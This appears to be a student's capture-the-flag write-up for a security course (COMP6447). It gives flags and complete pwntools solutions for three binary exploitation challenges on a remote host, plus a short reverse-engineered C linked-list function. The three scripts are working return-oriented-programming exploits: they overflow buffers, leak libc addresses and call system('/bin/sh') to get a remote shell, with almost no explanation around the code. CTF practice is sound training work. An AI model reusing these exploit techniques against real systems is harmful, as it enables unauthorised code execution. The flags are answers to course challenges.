
## SWROP

Flag: `COMP6447{this_was-easy}`

from pwn import *
p = remote('plzpwn.me',6000)
#r = process('./swrop')
p.recv()
p.sendline('A'*136+p32(0x08048390)+p32(0)+p32(0x080485f0))
p.interactive()

## roproprop
Flag: `COMP6447{nomnomnom..i mean roproprop}`

```
from pwn import *

libc = ELF('./libc-2.23.so')

p = remote("plzpwn.me", 6002)

p.recv(2)
leak = int(p.recv(10), 16)
p.recv()

libc.address = leak - libc.symbols['setbuf']
system = libc.symbols['system']
binsh = libc.search("/bin/sh").next()

p.sendline('A'*(0x4ce)+p32(system)+p32(0)+p32(binsh))
p.interactive()
```

## ropme
Flag: `COMP6447{no_u_come_up_with_another_flag}`

```
from pwn import *


puts_plt = 0x080483b0
puts_got = 0x0804a014
vuln = 0x0804850a
# p = process('./ropme')
p = remote("plzpwn.me",6003);
# gdb.attach(p, gdbscript = 'b *vuln+1')

print p.recv()
p.sendline('A'*12 +
        p32(puts_plt) +
        p32(vuln+1) +
        p32(puts_got)
        )
leak = u32(p.recv(4))
print hex(leak)
# p.interactive()

p.recv()

libc = ELF('./libc-2.23.so')
# libc = ELF('./libc-2.27.so')
libc.address = leak - libc.symbols['_IO_puts']
system = libc.symbols['system']
binsh = libc.search("/bin/sh").next()
print "system() = " + hex(system)
print "binsh() = " + hex(binsh)

p.sendline(
        'A'*12+
        p32(system)+
        p32(0)+
        p32(binsh)
        )
p.interactive()
```

## RE
```
#include <stdlib.h>
struct node {
	char val;
	struct node *nxt;
};

struct node* new () {
	int b = 0;
	struct node *a;
	struct node *c = NULL;

	while (b <= 9) {
		a = malloc(8);
		if (a == NULL) {
			exit(1);
		}
		if (c != NULL) {
			a->nxt = c;
			c = a;
		} else {
			c = a;
		}
		a->nxt = NULL;
		a->val = b + 'A';

		b++;
	}
	return c;
}
```

